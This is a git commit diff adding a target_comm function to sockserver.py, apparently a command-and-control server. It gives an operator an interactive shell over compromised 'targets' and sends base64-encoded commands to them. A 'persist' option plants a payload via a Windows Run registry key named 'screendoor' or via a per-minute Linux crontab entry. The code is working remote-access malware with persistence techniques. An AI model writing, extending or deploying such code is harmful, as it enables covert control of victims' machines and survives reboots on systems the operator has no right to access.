944c0c9fcc90dc339e0682d09777c9f01814677d
Matu Kahsay <108632333+matu-kahsay@users.noreply.github.com>
2024-02-27 11:26:59 -0800

    Enhance interaction with targets through comprehensive command handling

--- sockserver.py
+++ sockserver.py
@@ -39,4 +39,44 @@ def comm_out(targ_id, message):
     message = str(message)
     message = base64.b64encode(bytes(message, encoding='utf8'))
     targ_id.send(message)
-    
+
+def target_comm(targ_id, targets, num):
+    while True:
+        message = input(f'{targets[num][3]}/{targets[num][1]}#> ')
+        if len(message) == 0:
+            continue
+        if message == 'help':
+            pass
+        else:
+            comm_out(targ_id, message)
+        if message == 'exit':
+            message = base64.b64encode(message.encode())
+            targ_id.send(message)
+            targ_id.close()
+            targets[num][7] = 'Dead'
+            break
+        if message == 'background':
+            break
+        if message == 'persist':
+            payload_name = input('[+] Enter the name of the payload to add to persistence: ')
+            if targets[num][6] == 1:
+                persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
+                persist_command_1 = base64.b64encode(persist_command_1.encode())
+                targ_id.send(persist_command_1)
+                persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
+                persist_command_2 = base64.b64encode(persist_command_2.encode())
+                targ_id.send(persist_command_2)
+                print('[+] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /f')
+            if targets[num][6] == 2:
+                persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
+                persist_command = base64.b64encode(persist_command.encode())
+                targ_id.send(persist_command)
+                print('[+] Run this command to clean up the crontab: \n crontab -r')
+            print('[+] Persistence technique completed.')
+        else:
+            response = comm_in(targ_id)
+            if response == 'exit':
+                print('[-] The client has terminated the session.')
+                targ_id.close()
+                break
+            print(response)
